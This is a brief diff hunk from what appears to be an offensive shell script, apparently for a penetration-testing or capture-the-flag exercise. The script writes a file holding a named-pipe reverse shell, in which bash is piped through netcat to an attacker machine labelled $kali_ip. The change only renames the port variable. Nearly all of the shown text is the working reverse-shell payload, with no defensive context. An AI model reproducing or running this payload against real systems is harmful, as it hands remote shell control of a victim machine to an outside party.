@@ -41,6 +41,6 @@ cat <<EOF > $im_root
 #!/usr/bin/bash
 rm -f /tmp/file
 mkfifo /tmp/file
-/bin/bash </tmp/file | nc $kali_ip $port >/tmp/file
+/bin/bash </tmp/file | nc $kali_ip $kali_port >/tmp/file
 EOF
 
